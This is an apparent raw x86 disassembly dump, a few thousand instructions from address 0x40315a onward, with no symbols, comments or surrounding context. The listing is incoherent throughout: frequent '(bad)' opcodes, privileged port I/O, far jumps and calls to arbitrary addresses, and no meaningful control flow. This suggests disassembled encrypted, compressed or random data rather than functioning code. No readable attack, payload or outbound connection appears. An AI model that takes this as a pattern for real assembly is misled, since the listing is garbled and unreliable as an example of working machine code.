  40315a:	sbb    al,0x40
  40315c:	and    edi,DWORD PTR [eax-0x592fb270]
  403162:	and    DWORD PTR [edx+0x7],ebx
  403165:	fldenv ds:0x83a3cd4
  40316b:	lock mov edi,?
  40316e:	dec    ebx
  40316f:	mov    dl,0x14
  403171:	pop    ecx
  403172:	shl    DWORD PTR ds:[eax-0x15],1
  403176:	fadd   QWORD PTR [ecx+0x2b]
  403179:	pop    es
  40317a:	test   al,al
  40317c:	dec    edx
  40317d:	jmp    0x403108
  40317f:	in     al,dx
  403180:	and    BYTE PTR [eax+edi*1],ah
  403183:	push   0xac87a501
  403188:	aad    0x51
  40318a:	pop    es
  40318b:	adc    eax,0x865ab7af
  403190:	and    BYTE PTR ds:0xd993e971,0x99
  403197:	push   ebx
  403198:	mov    esi,0x6c3ffe91
  40319d:	loope  0x403154
  40319f:	push   es
  4031a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031a1:	jle    0x4031ed
  4031a3:	inc    esp
  4031a4:	pop    DWORD PTR [ebp+0x1a42e941]
  4031aa:	pop    edx
  4031ab:	push   es
  4031ac:	pushf  
  4031ad:	aaa    
  4031ae:	jle    0x403143
  4031b0:	sub    BYTE PTR [edx],al
  4031b2:	popa   
  4031b3:	inc    ebp
  4031b4:	bound  edi,QWORD PTR [ebx+0x79064a5a]
  4031ba:	pop    edx
  4031bb:	jecxz  0x403145
  4031bd:	shl    DWORD PTR [ebx],0x5a
  4031c0:	fadd   st(4),st
  4031c2:	mov    esp,0x876fe29c
  4031c7:	aaa    
  4031c8:	fistp  WORD PTR [ebp-0x30]
  4031cb:	dec    ebp
  4031cc:	xor    ecx,edx
  4031ce:	jo     0x4031bf
  4031d0:	stos   DWORD PTR es:[edi],eax
  4031d1:	js     0x4031ec
  4031d3:	(bad)  
  4031d4:	and    eax,0x4f50c823
  4031d9:	test   dh,dl
  4031db:	test   al,0xf6
  4031dd:	aam    0x90
  4031df:	cmp    BYTE PTR [ebx+esi*1+0x9],bh
  4031e3:	mov    bl,0xc7
  4031e5:	mov    esp,fs
  4031e7:	mov    ah,0x89
  4031e9:	pop    ebp
  4031ea:	clc    
  4031eb:	int3   
  4031ec:	add    dh,BYTE PTR [edi-0x13f8bd2]
  4031f2:	nop
  4031f3:	cmp    dl,0xb
  4031f6:	ds (bad) 
  4031f8:	popa   
  4031f9:	cmp    BYTE PTR [edi+0x787e4039],ch
  4031ff:	xor    eax,0xc6c5fc03
  403204:	adc    DWORD PTR fs:[ebx],0x8f9c15f
  40320b:	mov    ds:0x11761b52,al
  403210:	out    0x47,al
  403212:	jecxz  0x4031d8
  403214:	adc    BYTE PTR [ecx],cl
  403216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403217:	lods   al,BYTE PTR ds:[esi]
  403218:	(bad)  
  403219:	jl     0x4031aa
  40321b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40321c:	in     al,dx
  40321d:	push   edx
  40321e:	dec    edx
  40321f:	mov    edi,DWORD PTR [ecx-0x5a86ef07]
  403225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403226:	jne    0x403242
  403228:	jo     0x403251
  40322a:	scas   al,BYTE PTR es:[edi]
  40322b:	sub    ecx,ebp
  40322d:	xor    al,0xfa
  40322f:	push   ebx
  403230:	xchg   ecx,eax
  403231:	addr16 pop ds
  403233:	add    al,0x87
  403235:	arpl   WORD PTR [eax],si
  403237:	xchg   edi,eax
  403238:	sti    
  403239:	cmp    esi,DWORD PTR [esi-0x7883f5d8]
  40323f:	pop    ss
  403240:	sbb    DWORD PTR [eax],esi
  403242:	ins    BYTE PTR es:[edi],dx
  403243:	sahf   
  403244:	enter  0xba8a,0x33
  403248:	fwait
  403249:	imul   esp,DWORD PTR [ecx+eiz*4],0x45
  40324d:	dec    eax
  40324e:	xchg   esi,eax
  40324f:	imul   ebp,edi,0xffffff95
  403252:	adc    esp,DWORD PTR [edi]
  403254:	jmp    0xafc3f9fe
  403259:	hlt    
  40325a:	sub    al,0xbd
  40325c:	pop    edi
  40325d:	push   ss
  40325e:	ror    DWORD PTR ds:0x83ebbfef,0x31
  403265:	call   0x8e4e3749
  40326a:	repnz xchg edi,eax
  40326c:	mov    al,ds:0x8ea7b3e2
  403271:	jecxz  0x4032cc
  403273:	inc    ebx
  403274:	push   ecx
  403275:	cmovno esp,DWORD PTR [eax+esi*8+0x5]
  40327a:	out    dx,al
  40327b:	lds    bx,DWORD PTR gs:[edx-0x3f]
  403280:	sub    esp,0xffffffdb
  403283:	inc    ecx
  403284:	lds    ecx,FWORD PTR [ecx]
  403286:	jmp    0x2afa:0x9e6c78f6
  40328d:	jne    0x4032ae
  40328f:	and    dl,dl
  403291:	push   ebp
  403292:	xor    DWORD PTR [ebx-0xb],esi
  403295:	mov    edx,ebx
  403297:	inc    edx
  403298:	(bad)  
  403299:	sbb    al,0xda
  40329b:	or     eax,0x62db85a6
  4032a0:	inc    ebp
  4032a1:	push   eax
  4032a2:	retf   
  4032a3:	sub    BYTE PTR [ebx+edi*2+0x7b],0xc2
  4032a8:	stc    
  4032a9:	or     DWORD PTR [edx+0x2fdc20bf],esp
  4032af:	mov    edi,0xeb3b645d
  4032b4:	xchg   esp,eax
  4032b5:	fidiv  WORD PTR [edx+0x350fb227]
  4032bb:	jle    0x40326e
  4032bd:	retf   0x7fac
  4032c0:	iret   
  4032c1:	call   0x8a7ecee1
  4032c6:	cmp    BYTE PTR [edi-0x3d139cfa],bh
  4032cc:	(bad)  
  4032cd:	ins    BYTE PTR es:[edi],dx
  4032ce:	pop    es
  4032cf:	in     al,dx
  4032d0:	fisubr DWORD PTR [edx]
  4032d2:	sbb    al,0x3f
  4032d4:	aam    0xdf
  4032d6:	stos   BYTE PTR es:[edi],al
  4032d7:	adc    al,0xa3
  4032d9:	pop    eax
  4032da:	repz inc esi
  4032dc:	leave  
  4032dd:	in     eax,0x3c
  4032df:	mov    ebx,0x5863f12
  4032e4:	inc    edx
  4032e5:	rcl    ebx,1
  4032e7:	mov    edi,0x3246c440
  4032ec:	addr16 jge 0x403296
  4032ef:	dec    ebp
  4032f0:	lock iret 
  4032f2:	mov    esi,0xfeb8effe
  4032f7:	inc    eax
  4032f8:	hlt    
  4032f9:	adc    BYTE PTR [edx],al
  4032fb:	aaa    
  4032fc:	in     al,0xda
  4032fe:	push   eax
  4032ff:	mov    ebx,0x33a144ac
  403304:	imul   edx,DWORD PTR ds:0x75a00d88,0x822bae9b
  40330e:	jbe    0x403291
  403310:	inc    eax
  403311:	(bad)  
  403313:	and    BYTE PTR gs:[ebx+0x23327510],0x3e
  40331b:	inc    ebx
  40331c:	stos   DWORD PTR es:[edi],eax
  40331d:	clc    
  40331e:	imul   ebx,DWORD PTR [edi+0x29],0x1b
  403322:	push   ebx
  403323:	cs lods eax,DWORD PTR ss:[esi]
  403326:	aad    0x0
  403328:	cmp    DWORD PTR [edi-0x343a67f0],ebp
  40332e:	jge    0x403369
  403330:	cmp    BYTE PTR [ebp+0x42],bl
  403333:	pop    ebp
  403334:	push   ds
  403335:	jbe    0x40331a
  403337:	sub    eax,DWORD PTR [edx-0x60e1829a]
  40333d:	pop    ebp
  40333e:	fsubr  QWORD PTR [edx-0x42]
  403341:	mov    dl,0x2b
  403343:	jp     0x40334d
  403345:	pmullw mm2,QWORD PTR [eax+ebp*8]
  403349:	mov    bh,0xde
  40334b:	gs mov cl,0x2d
  40334e:	leave  
  40334f:	sar    DWORD PTR [eax-0x75],1
  403352:	popf   
  403353:	xor    bh,BYTE PTR [ecx+0x92ce1b8]
  403359:	fisttp DWORD PTR [edx+0xdee7b00]
  40335f:	push   edi
  403360:	mov    dl,0x1c
  403362:	pop    ebx
  403363:	std    
  403364:	shr    DWORD PTR [ecx],0x70
  403367:	pop    es
  403368:	aas    
  403369:	mov    al,0x6a
  40336b:	ja     0x4033dd
  40336d:	jmp    0x4033b7
  40336f:	dec    ecx
  403370:	mov    esi,0x1e86c7d4
  403375:	bound  ebx,QWORD PTR [ebx-0x9ce1d38]
  40337b:	xor    ebx,esp
  40337d:	pop    ecx
  40337e:	xlat   BYTE PTR ds:[ebx]
  40337f:	push   edx
  403380:	mov    ebx,0x4d6c3747
  403385:	addr16 out 0x28,al
  403388:	add    DWORD PTR ds:0xeeab3f15,esi
  40338e:	inc    edx
  40338f:	repnz and BYTE PTR [edx-0x7ec7e126],al
  403396:	shr    edx,0x16
  403399:	loope  0x4033c6
  40339b:	push   esi
  40339c:	inc    ecx
  40339d:	cmp    eax,0x63280c77
  4033a2:	sub    DWORD PTR [esi-0x65],edi
  4033a5:	and    eax,0xc12c6fe7
  4033aa:	jae    0x403390
  4033ac:	or     ah,BYTE PTR [edi+0x6b]
  4033af:	xchg   edx,eax
  4033b0:	jecxz  0x40336f
  4033b2:	fadd   QWORD PTR [ebx-0x49]
  4033b5:	adc    DWORD PTR [ebx-0x70e1fd91],0x49
  4033bc:	inc    esp
  4033bd:	jno    0x403394
  4033bf:	jnp    0x403360
  4033c1:	scas   al,BYTE PTR es:[edi]
  4033c2:	mov    WORD PTR [ebx+0x68],ss
  4033c5:	in     eax,dx
  4033c6:	lahf   
  4033c7:	in     al,0x4d
  4033c9:	add    ecx,DWORD PTR [edi+0x27b566c1]
  4033cf:	clc    
  4033d0:	push   ecx
  4033d1:	pop    ds
  4033d2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033d4:	cld    
  4033d5:	std    
  4033d6:	xchg   DWORD PTR [esi-0x75795a93],eax
  4033dc:	mov    DWORD PTR [edi-0x54],esi
  4033df:	imul   ecx,ebx,0x32d0b6d1
  4033e5:	add    al,0x63
  4033e7:	or     ecx,eax
  4033e9:	push   ss
  4033ea:	out    0x4e,eax
  4033ec:	loop   0x403460
  4033ee:	mov    DWORD PTR [eax],eax
  4033f0:	lahf   
  4033f1:	dec    eax
  4033f2:	jbe    0x40342d
  4033f4:	mov    ch,0xc9
  4033f6:	mov    ds:0x88b1556d,eax
  4033fb:	fs in  eax,dx
  4033fd:	cld    
  4033fe:	fstp   DWORD PTR [ebx]
  403400:	add    DWORD PTR ds:0xf13b93ad,edx
  403406:	or     ebp,DWORD PTR [eax+ecx*2+0xf]
  40340a:	cmp    ah,cl
  40340c:	and    al,BYTE PTR [esi-0x25beaf17]
  403412:	dec    ebx
  403413:	ret    0x6dc6
  403416:	ja     0x4033b3
  403418:	xchg   ebp,eax
  403419:	jbe    0x4033a6
  40341b:	or     DWORD PTR [ebx-0x45],esp
  40341e:	(bad)  
  40341f:	icebp  
  403420:	add    eax,0x73bae888
  403425:	std    
  403426:	add    al,0x8b
  403428:	add    BYTE PTR [edx-0x1bf99d2b],dl
  40342e:	pop    es
  40342f:	(bad)  
  403430:	jnp    0x40345e
  403432:	retf   0x8574
  403435:	push   ebx
  403436:	aam    0xd4
  403438:	int3   
  403439:	nop
  40343a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40343b:	das    
  40343c:	xchg   ebp,eax
  40343d:	add    ecx,DWORD PTR [ebx-0xb]
  403440:	mov    BYTE PTR [ebx+eiz*8],dl
  403443:	adc    edx,DWORD PTR [esi]
  403445:	int3   
  403446:	int    0x3a
  403448:	pop    edi
  403449:	and    DWORD PTR [eax-0x1fe318bc],edx
  40344f:	sbb    eax,0x1993c192
  403454:	mov    cl,0x20
  403456:	retf   
  403457:	dec    eax
  403458:	outs   dx,DWORD PTR ds:[esi]
  403459:	inc    edx
  40345a:	or     al,0xeb
  40345c:	arpl   WORD PTR [esi+0x28],ax
  40345f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403460:	loope  0x4033f8
  403462:	shl    edi,0x31
  403465:	jecxz  0x4034a1
  403467:	call   0xdb6efe77
  40346c:	repz fwait
  40346e:	or     BYTE PTR [edi+0x3],al
  403471:	jl     0x403487
  403473:	(bad)  
  403474:	lock or DWORD PTR ds:0xfd9507f5,ecx
  40347b:	outs   dx,DWORD PTR ds:[esi]
  40347c:	mov    al,0xcc
  40347e:	pop    edi
  40347f:	js     0x403441
  403481:	lock xchg BYTE PTR [ebp+0x38efbab2],bl
  403488:	mov    eax,ds:0x413372d3
  40348d:	pop    esi
  40348e:	pop    esp
  40348f:	aas    
  403490:	inc    edx
  403491:	mov    eax,ds:0x6016577b
  403496:	xchg   cx,ax
  403498:	or     DWORD PTR [edx+ebp*2-0x4e],ebp
  40349c:	(bad)  
  40349d:	mov    cl,0x77
  40349f:	fcom   QWORD PTR [eax]
  4034a1:	pop    edx
  4034a3:	popf   
  4034a4:	xchg   ebx,eax
  4034a5:	dec    edx
  4034a6:	mov    dh,0xbe
  4034a8:	not    BYTE PTR cs:[eax]
  4034ab:	inc    edi
  4034ac:	add    BYTE PTR [ecx-0x4043f12f],bl
  4034b2:	mov    dh,0x89
  4034b4:	pop    edi
  4034b5:	cli    
  4034b6:	es aas 
  4034b8:	jmp    0x9a04:0xf836bda7
  4034bf:	xchg   edx,eax
  4034c0:	cld    
  4034c1:	xor    al,0xf4
  4034c3:	clc    
  4034c4:	mov    eax,0xeea9d19e
  4034c9:	repnz add BYTE PTR [ebx-0x34f49ded],0x1e
  4034d1:	push   cs
  4034d2:	hlt    
  4034d3:	adc    BYTE PTR [di+0x47e3],0x75
  4034d9:	or     edi,DWORD PTR [ebp-0x223f8cce]
  4034df:	retf   0x6005
  4034e2:	dec    esi
  4034e3:	inc    esi
  4034e4:	xchg   DWORD PTR [eax+0xd648282],esp
  4034ea:	mov    cl,0x2
  4034ed:	fist   DWORD PTR [edx-0x39]
  4034f0:	in     eax,0xc1
  4034f2:	adc    ebx,DWORD PTR [edx-0x6d]
  4034f5:	dec    edi
  4034f6:	push   ebp
  4034f7:	std    
  4034f8:	fild   QWORD PTR [edx]
  4034fa:	jae    0x403540
  4034fc:	in     al,dx
  4034fd:	rol    BYTE PTR [esi+0x7c],1
  403500:	data16 js 0x403524
  403503:	mov    esi,0x376fbc62
  403508:	xor    BYTE PTR [ebp+0x7c254c93],dl
  40350e:	(bad)  
  403510:	cmp    esi,DWORD PTR [edi+edx*8+0x7b59a121]
  403517:	sbb    ah,BYTE PTR [ecx]
  403519:	out    0xe8,al
  40351b:	mov    esp,0x8513c5f8
  403520:	dec    ecx
  403521:	cmp    bl,dh
  403523:	jp     0x403588
  403525:	adc    esi,DWORD PTR [edx]
  403527:	out    dx,eax
  403528:	xchg   edi,eax
  403529:	lods   eax,DWORD PTR ds:[esi]
  40352a:	aad    0xf1
  40352c:	repz mov cs,edx
  40352f:	rol    DWORD PTR [edi-0x7a],0xe7
  403533:	enter  0x2ea6,0xe0
  403537:	mov    esp,0x592482bb
  40353c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40353d:	in     al,0x3f
  40353f:	mov    ecx,DWORD PTR [edi+0xf]
  403542:	test   ecx,0xc1ddd53f
  403548:	adc    DWORD PTR ds:0xd509a13b,edx
  40354e:	fnstcw WORD PTR [eax-0x50a02904]
  403554:	js     0x403564
  403556:	dec    eax
  403557:	jnp    0x4035d7
  403559:	jns    0x4035b4
  40355b:	push   ebp
  40355c:	dec    esi
  40355d:	or     al,0x12
  40355f:	and    BYTE PTR [esi+0x56c079fa],dl
  403565:	jge    0x403507
  403567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403568:	cmp    DWORD PTR [esi+ebx*8+0x6d],0xa212d967
  403570:	jmp    0x40351e
  403572:	nop
  403573:	shl    edx,1
  403575:	mov    esi,0x4686a997
  40357a:	and    BYTE PTR [ebp+0x715dfaa1],al
  403580:	into   
  403581:	xor    edx,edx
  403583:	or     edx,DWORD PTR [edx]
  403585:	mov    ecx,0x4bb08d0c
  40358a:	xchg   edx,eax
  40358b:	and    DWORD PTR [esi-0x7e],edx
  40358e:	jp     0x4035d7
  403590:	call   0xb5cc3e4f
  403595:	and    DWORD PTR [ecx+esi*4],edi
  403598:	call   0x14f4:0xbb2b7e19
  40359f:	imul   ebp,DWORD PTR [ebx-0x3f6853f4],0x39
  4035a6:	inc    ebp
  4035a7:	outs   dx,DWORD PTR ds:[esi]
  4035a8:	push   ebp
  4035a9:	add    esp,DWORD PTR [esi+0x26]
  4035ac:	push   ebp
  4035ad:	std    
  4035ae:	dec    edx
  4035af:	jno    0x4035f8
  4035b1:	inc    ebx
  4035b2:	leave  
  4035b3:	rcr    BYTE PTR [edx+ebx*8+0x6f],0x3e
  4035b8:	jp     0x40354a
  4035ba:	sbb    esi,DWORD PTR [edx+eax*1]
  4035bd:	push   edi
  4035be:	jge    0x4035b5
  4035c0:	add    ch,BYTE PTR [ecx+0x7a]
  4035c3:	mov    al,ds:0x21c7ce0a
  4035c8:	jae    0x403603
  4035ca:	inc    ebp
  4035cb:	push   cs
  4035cc:	sbb    eax,0x664b4b3
  4035d1:	sbb    eax,0x5001fe5b
  4035d6:	mov    bh,0xf4
  4035d8:	inc    esp
  4035d9:	mov    bh,ah
  4035db:	in     eax,dx
  4035dc:	in     al,dx
  4035dd:	ins    BYTE PTR es:[edi],dx
  4035de:	out    0x35,al
  4035e0:	mov    bl,0xac
  4035e2:	jne    0x40364f
  4035e4:	mov    dh,0xd6
  4035e6:	aaa    
  4035e7:	ffreep st(3)
  4035e9:	daa    
  4035ea:	fldcw  WORD PTR [ecx+0x1f9842a7]
  4035f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035f1:	mov    al,0xa
  4035f3:	sub    DWORD PTR [ebx+0x6f],ebp
  4035f6:	sbb    al,0x14
  4035f8:	or     al,0xe2
  4035fa:	call   0xf7c40d93
  4035ff:	xchg   DWORD PTR [esp+ebx*1-0x5e],ebx
  403603:	fidiv  DWORD PTR [esi+eiz*8]
  403606:	push   edi
  403607:	xchg   edx,eax
  403608:	add    dl,ah
  40360a:	cli    
  40360b:	into   
  40360c:	scas   al,BYTE PTR es:[edi]
  40360d:	jecxz  0x40366d
  40360f:	aam    0x67
  403611:	and    al,0x35
  403613:	loopne 0x4035cd
  403615:	jnp    0x4035bd
  403617:	mov    cl,BYTE PTR [edx-0x4d0816b5]
  40361d:	jmp    0x6077:0x50e414bc
  403624:	aaa    
  403625:	push   edx
  403626:	pop    ebp
  403627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403628:	mov    cl,0x9f
  40362a:	add    eax,0xff046baa
  40362f:	ins    BYTE PTR es:[edi],dx
  403630:	pslld  mm0,mm1
  403633:	cli    
  403634:	cld    
  403635:	jge    0x40361d
  403637:	test   al,0x70
  403639:	cmp    al,0xb3
  40363b:	inc    edi
  40363c:	or     ebp,ecx
  40363e:	cmp    bh,ah
  403640:	jno    0x403653
  403642:	call   0xfd1116e5
  403647:	mov    al,ds:0x9ff06de9
  40364c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40364d:	cmp    dh,dl
  40364f:	icebp  
  403650:	not    DWORD PTR ss:[edx+esi*2+0xd]
  403655:	inc    eax
  403656:	cmp    eax,DWORD PTR [edi]
  403658:	push   0xffffff90
  40365a:	ret    0xf81b
  40365d:	jbe    0x4036b1
  40365f:	mov    cl,0x5b
  403661:	and    BYTE PTR [esi],ch
  403663:	mov    BYTE PTR [esi],bl
  403665:	outs   dx,BYTE PTR ds:[esi]
  403666:	dec    esi
  403667:	lods   eax,DWORD PTR ds:[esi]
  403668:	ds cmp al,0x64
  40366b:	pushf  
  40366c:	pusha  
  40366d:	lea    edi,[edi]
  40366f:	jmp    0xd72b1cb7
  403674:	int    0xe7
  403676:	lahf   
  403677:	mov    WORD PTR [edi-0x21],gs
  40367a:	mov    ecx,0xf6098096
  40367f:	outs   dx,DWORD PTR ds:[esi]
  403680:	sub    al,0xdf
  403682:	adc    ah,BYTE PTR [edx-0x42813e3a]
  403688:	mov    ebx,0x9fa1f46a
  40368d:	xor    eax,0x25b8407b
  403692:	test   ebx,0x6accf271
  403698:	sbb    BYTE PTR [edi-0x73],ah
  40369b:	mov    BYTE PTR [ecx-0x40a2626],al
  4036a1:	shl    DWORD PTR [edx-0x39],0x1b
  4036a5:	mov    ecx,DWORD PTR [ecx-0x5678dcfd]
  4036ab:	fild   WORD PTR [eax+0x57]
  4036ae:	or     edi,DWORD PTR [esi-0x620296ab]
  4036b4:	adc    BYTE PTR [edi],bl
  4036b6:	fld    QWORD PTR [ebx-0x398547ed]
  4036bc:	and    bl,BYTE PTR [ebx-0x1b38b9c0]
  4036c2:	out    dx,eax
  4036c3:	or     DWORD PTR [esp+eiz*2],edi
  4036c6:	outs   dx,BYTE PTR ds:[esi]
  4036c7:	jge    0x4036b1
  4036c9:	test   al,0xc8
  4036cb:	push   esi
  4036cc:	int3   
  4036cd:	mov    ecx,0xbbf588dd
  4036d2:	adc    eax,0x4260ec6b
  4036d7:	sub    eax,eax
  4036d9:	inc    ebp
  4036da:	test   ch,bl
  4036dc:	bound  esp,QWORD PTR [eax]
  4036de:	shl    DWORD PTR [esi-0x31e05888],0x49
  4036e5:	dec    esp
  4036e6:	and    bl,BYTE PTR gs:[edi-0x4ceedc97]
  4036ed:	jmp    0x4036fe
  4036ef:	push   edi
  4036f0:	push   ds
  4036f1:	int    0x90
  4036f3:	in     al,dx
  4036f4:	sahf   
  4036f5:	jmp    0x403762
  4036f7:	out    dx,eax
  4036f8:	mov    esi,0x1ebc7e15
  4036fd:	sub    eax,ecx
  4036ff:	mov    dh,0x9e
  403701:	inc    edx
  403702:	test   eax,0xd2397b47
  403707:	add    edx,DWORD PTR ds:0x3ebe382f
  40370d:	lds    edi,FWORD PTR [ebx]
  40370f:	clc    
  403710:	out    dx,al
  403711:	jmp    0x403744
  403713:	loop   0x403780
  403715:	fxam   
  403717:	inc    ebp
  403718:	sbb    ch,dl
  40371a:	cmp    ch,BYTE PTR [esi-0x46]
  40371d:	xor    al,0x9c
  40371f:	mov    al,ds:0x9dce2b96
  403724:	loopne 0x4036ce
  403726:	outs   dx,DWORD PTR ds:[esi]
  403727:	psubsb mm6,mm3
  40372a:	pop    ebp
  40372b:	push   ecx
  40372c:	push   0x44f597ef
  403731:	in     al,dx
  403732:	or     al,0xee
  403734:	mov    al,0xd5
  403736:	in     eax,0x6b
  403738:	jp     0x403718
  40373a:	outs   dx,DWORD PTR ds:[esi]
  40373b:	cmp    DWORD PTR [ebx],eax
  40373d:	inc    eax
  40373e:	jno    0x403776
  403740:	repnz sub eax,0x545f3039
  403746:	pop    ebp
  403747:	xor    BYTE PTR [edx],ch
  403749:	mov    esi,0x42db3b0
  40374e:	fisub  DWORD PTR [edi]
  403750:	lock rol DWORD PTR [edi+0xd],1
  403754:	xchg   esi,eax
  403755:	mov    bl,0xa1
  403757:	add    eax,0x331f77ae
  40375c:	clc    
  40375d:	xor    DWORD PTR [ebx+0x332d0fdb],ecx
  403763:	fcmovnb st,st(6)
  403765:	mov    bh,0xc0
  403767:	xor    eax,0x6f0adc71
  40376c:	lea    eax,[edx+0x6ef716ac]
  403772:	rol    esi,1
  403774:	js     0x40379f
  403776:	adc    eax,0x61e6b7e8
  40377b:	xchg   esi,eax
  40377c:	mov    al,0x6d
  40377e:	sub    al,bl
  403780:	fsub   QWORD PTR [ecx+ecx*4-0x81f146c]
  403787:	retf   0x8212
  40378a:	inc    ebp
  40378b:	cmp    BYTE PTR [ecx+edx*2],bl
  40378e:	std    
  40378f:	out    dx,al
  403790:	gs test eax,0xa38c769a
  403796:	cmovle edx,DWORD PTR [esi+0x6551de26]
  40379d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40379e:	iret   
  40379f:	cmp    ch,BYTE PTR [ebp-0x36]
  4037a2:	cwde   
  4037a3:	and    BYTE PTR [ebx-0x6c],cl
  4037a6:	jecxz  0x403743
  4037a8:	dec    esp
  4037a9:	sbb    BYTE PTR [eax],cl
  4037ab:	out    0xc8,eax
  4037ad:	retf   
  4037ae:	sub    BYTE PTR [eax+edi*8+0x75e14cdc],dh
  4037b5:	adc    bh,BYTE PTR [eax]
  4037b7:	(bad)  
  4037b8:	jnp    0x403766
  4037ba:	lea    ebx,[edi]
  4037bc:	mov    eax,ds:0xdff49a1c
  4037c1:	leave  
  4037c2:	adc    eax,0xa42bb3a1
  4037c7:	outs   dx,BYTE PTR ds:[esi]
  4037c8:	or     cl,BYTE PTR [ebx-0x6a]
  4037cb:	cmp    esi,esp
  4037cd:	push   cs
  4037ce:	ja     0x4037d9
  4037d0:	dec    edx
  4037d1:	pop    ss
  4037d2:	sbb    al,0x7e
  4037d4:	xchg   esi,eax
  4037d5:	cmp    edx,DWORD PTR [eax]
  4037d7:	imul   ecx,DWORD PTR [eax],0x4be162df
  4037dd:	push   ds
  4037de:	fisub  WORD PTR [edx+ebp*2-0x26]
  4037e2:	cmp    eax,0xe56ab072
  4037e7:	xor    DWORD PTR [edi-0x21],esp
  4037ea:	sub    DWORD PTR [edi],eax
  4037ec:	jp     0x40386d
  4037ee:	rol    ebx,cl
  4037f0:	jbe    0x403778
  4037f2:	xor    esi,DWORD PTR [esi+ecx*1]
  4037f5:	push   0x3a59d7ce
  4037fa:	dec    ecx
  4037fb:	sti    
  4037fc:	jae    0x4037ec
  4037fe:	push   edi
  4037ff:	dec    DWORD PTR [eax-0x2c]
  403802:	dec    ecx
  403803:	add    DWORD PTR [ecx],edx
  403805:	xchg   BYTE PTR [esi-0x27],ah
  403808:	adc    DWORD PTR [edi-0x6ee99ba1],edi
  40380e:	pop    edi
  40380f:	push   ss
  403810:	mov    eax,ds:0xafcc61e8
  403816:	in     al,dx
  403817:	inc    esi
  403818:	pop    eax
  403819:	mov    bh,0xd6
  40381b:	imul   edx,DWORD PTR [eax+esi*8-0x4c],0xffffff8a
  403820:	cmp    eax,0xe6e7fb98
  403825:	mov    edx,edx
  403827:	outs   dx,BYTE PTR ds:[esi]
  403828:	jge    0x4037eb
  40382a:	jb     0x403839
  40382c:	mov    dl,0x23
  40382e:	pop    esp
  40382f:	pushf  
  403830:	pushf  
  403831:	repnz stos BYTE PTR es:[edi],al
  403833:	mov    edi,0xa340ef3b
  403838:	or     DWORD PTR [esi+0x822ec04],0xb44c52d1
  403842:	outs   dx,DWORD PTR ds:[esi]
  403843:	mov    ds:0xae6e39a6,al
  403848:	cmp    ah,BYTE PTR [edx+0x1055a23e]
  40384e:	(bad)  
  403850:	ds pop edx
  403852:	cwde   
  403853:	sbb    ah,BYTE PTR [esi+0x12]
  403856:	cmc    
  403857:	or     eax,0x170bf5e8
  40385c:	jbe    0x4038aa
  40385e:	lds    esi,FWORD PTR [edi+ecx*1-0x1ae8593a]
  403865:	push   ebx
  403866:	add    BYTE PTR [ebx+0x683ecc94],bl
  40386c:	or     al,0x64
  40386e:	outs   dx,BYTE PTR ds:[esi]
  40386f:	pop    es
  403870:	mov    ebx,0x888e2fc2
  403875:	inc    ecx
  403876:	retf   
  403877:	daa    
  403878:	xor    BYTE PTR [ecx+edi*2+0x15609097],cl
  40387f:	mov    edi,0x1de4e87
  403884:	pop    ebp
  403885:	sbb    BYTE PTR es:[eax+0x3e],0xa5
  40388a:	fimul  WORD PTR [edx]
  40388c:	je     0x40381d
  40388e:	or     eax,0x8c6866a7
  403893:	xbegin 0x63649b5e
  403899:	push   es
  40389a:	sbb    eax,0x6085772c
  40389f:	push   ds
  4038a0:	push   ebx
  4038a1:	icebp  
  4038a2:	pop    edi
  4038a3:	push   ss
  4038a4:	loop   0x4038e6
  4038a6:	add    ecx,ebx
  4038a8:	mov    esi,0x2654040a
  4038ad:	adc    DWORD PTR [ebx],edx
  4038af:	stos   BYTE PTR es:[edi],al
  4038b0:	adc    DWORD PTR [edx],ebp
  4038b2:	or     eax,0x1b88cbe
  4038b7:	mov    edi,0x34b8bd68
  4038bc:	inc    ebp
  4038be:	add    ecx,DWORD PTR [esp+esi*2]
  4038c1:	xor    eax,0xa8b90ed
  4038c6:	mov    edi,0x38e3a822
  4038cb:	jg     0x4038f4
  4038cd:	mov    esp,0x58a7eb99
  4038d2:	xchg   ecx,eax
  4038d3:	cmc    
  4038d4:	inc    ebx
  4038d5:	pop    esp
  4038d6:	test   eax,0x2bdb2954
  4038db:	push   esi
  4038dc:	pop    edi
  4038dd:	add    ebp,DWORD PTR [edi]
  4038df:	xchg   BYTE PTR [eax-0x7a],bl
  4038e2:	mov    ebp,0xeea59882
  4038e7:	and    ch,BYTE PTR [ebx-0x4524e780]
  4038ed:	xor    edx,DWORD PTR [esi]
  4038ef:	pop    esp
  4038f0:	jecxz  0x403892
  4038f2:	popf   
  4038f3:	push   edx
  4038f4:	xchg   esi,eax
  4038f5:	scas   al,BYTE PTR es:[edi]
  4038f6:	popa   
  4038f7:	or     bl,BYTE PTR [esi-0x6375e34c]
  4038fd:	sar    bl,cl
  4038ff:	daa    
  403900:	inc    edx
  403901:	inc    esi
  403902:	(bad)  
  403903:	out    0x39,al
  403905:	xchg   edx,eax
  403906:	xchg   DWORD PTR [edx-0x6d],esi
  403909:	push   esp
  40390a:	inc    edx
  40390b:	test   DWORD PTR [edi],eax
  40390d:	cmp    eax,0xf52baee3
  403912:	jbe    0x403987
  403914:	ror    DWORD PTR [ebx+ecx*1-0x4a],1
  403918:	test   DWORD PTR [ebx-0x5d],0x4f142d33
  40391f:	xchg   ebx,eax
  403920:	mov    esp,0x5fdbdd3a
  403925:	aaa    
  403926:	lds    eax,FWORD PTR [edi]
  403928:	aas    
  403929:	or     esp,ebp
  40392b:	sub    eax,0x1936cdbc
  403930:	test   BYTE PTR [edx+ecx*2-0x7f],ch
  403934:	push   eax
  403935:	push   eax
  403936:	scas   al,BYTE PTR es:[edi]
  403937:	push   ecx
  403938:	sar    cl,1
  40393a:	lea    edx,gs:[edi+0x5c]
  40393e:	les    esi,FWORD PTR [esi]
